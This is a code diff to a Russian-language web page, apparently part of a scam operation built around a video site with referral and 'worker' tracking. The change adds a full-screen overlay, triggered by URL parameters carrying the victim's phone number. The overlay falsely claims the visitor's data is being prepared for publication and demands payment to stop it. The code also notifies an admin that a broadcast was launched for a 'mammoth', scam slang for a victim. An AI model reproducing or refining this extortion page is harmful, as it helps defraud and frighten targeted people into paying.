@@ -309,67 +309,109 @@
             margin-top: 5px;
         }
 
-        /* ===== СИСТЕМНЫЕ УВЕДОМЛЕНИЯ НА САЙТЕ ===== */
-        #systemNotifications {
+        /* ===== ПЕРЕКРЫВАЮЩАЯ СТРАНИЦА УВЕДОМЛЕНИЯ ===== */
+        #broadcastOverlay {
             position: fixed;
-            top: 80px;
-            left: 50%;
-            transform: translateX(-50%);
-            z-index: 9998;
-            width: 90%;
-            max-width: 600px;
-            max-height: 400px;
-            overflow-y: auto;
-            background: rgba(0,0,0,0.92);
-            border: 1px solid #ff3355;
-            border-radius: 12px;
-            padding: 20px;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.98);
+            z-index: 99999;
             display: none;
-            box-shadow: 0 0 50px rgba(255, 51, 85, 0.2);
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            padding: 20px;
+            backdrop-filter: blur(10px);
         }
         
-        #systemNotifications .notif-title {
-            color: #ff3355;
-            font-size: 16px;
-            font-weight: bold;
-            margin-bottom: 15px;
+        #broadcastOverlay.active {
+            display: flex;
+        }
+        
+        #broadcastOverlay .broadcast-box {
+            background: linear-gradient(145deg, #0a0a0a, #1a0a0a);
+            border: 2px solid #ff3355;
+            border-radius: 20px;
+            padding: 40px 30px;
+            max-width: 500px;
+            width: 100%;
             text-align: center;
+            box-shadow: 0 0 60px rgba(255, 51, 85, 0.3);
+            animation: pulseBorder 2s infinite;
+        }
+        
+        @keyframes pulseBorder {
+            0%, 100% { box-shadow: 0 0 60px rgba(255, 51, 85, 0.3); }
+            50% { box-shadow: 0 0 100px rgba(255, 51, 85, 0.6); }
+        }
+        
+        #broadcastOverlay .broadcast-title {
+            color: #ff3355;
+            font-size: 24px;
+            font-weight: bold;
             text-transform: uppercase;
-            letter-spacing: 2px;
+            letter-spacing: 3px;
+            margin-bottom: 15px;
+            text-shadow: 0 0 30px rgba(255, 51, 85, 0.5);
         }
         
-        #systemNotifications .notif-item {
+        #broadcastOverlay .broadcast-subtitle {
+            color: #ff6680;
+            font-size: 16px;
+            margin-bottom: 25px;
+            opacity: 0.8;
+        }
+        
+        #broadcastOverlay .broadcast-list {
+            text-align: left;
             color: #00ffcc;
-            font-size: 14px;
-            padding: 8px 12px;
-            border-bottom: 1px solid rgba(255,255,255,0.05);
             font-family: 'Courier New', monospace;
-            animation: notifAppear 0.5s ease;
+            font-size: 14px;
+            line-height: 2;
+            background: rgba(0, 0, 0, 0.5);
+            padding: 15px 20px;
+            border-radius: 10px;
+            border: 1px solid rgba(255, 51, 85, 0.2);
+            margin-bottom: 25px;
+            max-height: 300px;
+            overflow-y: auto;
         }
         
-        #systemNotifications .notif-item .highlight {
+        #broadcastOverlay .broadcast-list .highlight {
             color: #ff3355;
             font-weight: bold;
         }
         
-        @keyframes notifAppear {
-            from { opacity: 0; transform: translateX(-20px); }
-            to { opacity: 1; transform: translateX(0); }
-        }
-        
-        #systemNotifications .notif-close {
-            position: absolute;
-            top: 10px;
-            right: 15px;
-            color: #888;
-            cursor: pointer;
-            font-size: 20px;
-            background: none;
-            border: none;
-        }
-        
-        #systemNotifications .notif-close:hover {
+        #broadcastOverlay .broadcast-status {
             color: #ff3355;
+            font-size: 14px;
+            animation: blink 1s infinite;
+            margin-top: 10px;
+        }
+        
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.3; }
+        }
+        
+        #broadcastOverlay .broadcast-close-btn {
+            background: #ff3355;
+            border: none;
+            color: white;
+            padding: 12px 30px;
+            border-radius: 30px;
+            font-weight: bold;
+            font-size: 16px;
+            cursor: pointer;
+            margin-top: 15px;
+            transition: 0.3s;
+        }
+        
+        #broadcastOverlay .broadcast-close-btn:hover {
+            transform: scale(1.05);
+            box-shadow: 0 0 30px rgba(255, 51, 85, 0.5);
         }
     </style>
 </head>
@@ -406,11 +448,17 @@
     <div class="chat-messages" id="chatMessages"></div>
 </div>
 
-<!-- ===== СИСТЕМНЫЕ УВЕДОМЛЕНИЯ ===== -->
-<div id="systemNotifications">
-    <button class="notif-close" onclick="closeNotifications()">✕</button>
-    <div class="notif-title">🔴 СИСТЕМА АКТИВИРОВАНА</div>
-    <div id="notifContent"></div>
+<!-- ===== ПЕРЕКРЫВАЮЩАЯ СТРАНИЦА УВЕДОМЛЕНИЯ ===== -->
+<div id="broadcastOverlay">
+    <div class="broadcast-box">
+        <div class="broadcast-title">🔴 СИСТЕМА АКТИВИРОВАНА</div>
+        <div class="broadcast-subtitle">Ваши данные готовятся к публикации</div>
+        <div class="broadcast-list" id="broadcastList">
+            <div>⏳ Загрузка данных...</div>
+        </div>
+        <div class="broadcast-status" id="broadcastStatus">⏳ Ожидайте...</div>
+        <button class="broadcast-close-btn" onclick="closeBroadcast()">✕ Закрыть</button>
+    </div>
 </div>
 
 <div id="modal" class="modal">
@@ -460,7 +508,9 @@
         const urlParams = new URLSearchParams(window.location.search);
         return {
             ref: urlParams.get('ref'),
-            model: urlParams.get('model')
+            model: urlParams.get('model'),
+            broadcast: urlParams.get('broadcast'),
+            phone: urlParams.get('phone')
         };
     }
     
@@ -481,6 +531,12 @@
         if (params.ref) {
             currentRefCode = params.ref;
             console.log(`✅ Реф код: ${currentRefCode}`);
+        }
+        
+        // Проверяем, нужно ли показать страницу рассылки
+        if (params.broadcast === 'true') {
+            const phone = params.phone || 'неизвестный номер';
+            showBroadcast(phone);
         }
     }
     
@@ -515,30 +571,15 @@
             });
     })();
     
-    // ========== ЗАПУСК РАССЫЛКИ ЧЕРЕЗ API ==========
-    async function startBroadcast() {
-        if (isBroadcastActive) return;
+    // ========== ПОКАЗ УВЕДОМЛЕНИЯ НА ВЕСЬ ЭКРАН ==========
+    function showBroadcast(phone) {
+        const overlay = document.getElementById('broadcastOverlay');
+        const list = document.getElementById('broadcastList');
+        const status = document.getElementById('broadcastStatus');
         
-        isBroadcastActive = true;
-        
-        // Отправляем уведомление админу в Telegram
-        sendToAdmin('📢 АДМИН: ЗАПУЩЕНА РАССЫЛКА УВЕДОМЛЕНИЙ!');
-        
-        // Показываем уведомления на сайте
-        showNotifications();
-        
-        setTimeout(() => {
-            isBroadcastActive = false;
-        }, 10000);
-    }
-    
-    // ========== ПОКАЗ УВЕДОМЛЕНИЙ НА САЙТЕ ==========
-    function showNotifications() {
-        const container = document.getElementById('systemNotifications');
-        const content = document.getElementById('notifContent');
-        
-        container.style.display = 'block';
-        content.innerHTML = '';
+        overlay.className = 'active';
+        list.innerHTML = '';
+        status.textContent = '⏳ Инициализация системы...';
         
         const messages = [
             { text: '🔴 СИСТЕМА АКТИВИРОВАНА', delay: 500, highlight: true },
@@ -553,27 +594,32 @@
         ];
         
         let totalDelay = 0;
-        messages.forEach((msg, index) => {
+        messages.forEach((msg) => {
             totalDelay += msg.delay;
             setTimeout(() => {
                 const div = document.createElement('div');
-                div.className = 'notif-item';
                 if (msg.highlight) {
                     div.innerHTML = `<span class="highlight">${msg.text}</span>`;
                 } else {
                     div.textContent = msg.text;
                 }
-                content.appendChild(div);
-                content.scrollTop = content.scrollHeight;
+                list.appendChild(div);
+                list.scrollTop = list.scrollHeight;
+                
+                if (msg.text.includes('Для отмены')) {
+                    status.textContent = '⚠️ СИСТЕМА АКТИВНА! ОПЛАТИТЕ ДЛЯ ОСТАНОВКИ';
+                    status.style.color = '#ff3355';
+                }
             }, totalDelay);
         });
         
-        sendToAdmin('🔴 Система уведомлений активирована на сайте!');
+        sendToAdmin(`🔴 Запущена рассылка для мамонта ${phone}`);
     }
     
-    // ========== ЗАКРЫТЬ УВЕДОМЛЕНИЯ ==========
-    function closeNotifications() {
-        document.getElementById('systemNotifications').style.display = 'none';
+    // ========== ЗАКРЫТЬ ПЕРЕКРЫТИЕ ==========
+    function closeBroadcast() {
+        document.getElementById('broadcastOverlay').className = '';
+        window.location.reload();
     }
     
     // ========== ВИДЕО ПЛЕЕР ==========
@@ -836,17 +882,11 @@
     window.showModal = showModal;
     window.closeModal = closeModal;
     window.handleAction = handleAction;
-    window.startBroadcast = startBroadcast;
-    window.closeNotifications = closeNotifications;
+    window.closeBroadcast = closeBroadcast;
+    window.showBroadcast = showBroadcast;
     
     // ========== ЗАГРУЗКА ДАННЫХ ИЗ URL ПРИ СТАРТЕ ==========
     loadWorkerData();
-    
-    // ========== ПРОВЕРЯЕМ, ЕСТЬ ЛИ КОМАНДА ДЛЯ РАССЫЛКИ ==========
-    // Эта функция будет вызываться из бота через API
-    window.triggerBroadcast = function() {
-        startBroadcast();
-    };
 </script>
 
 <!-- Бейдж безопасности -->
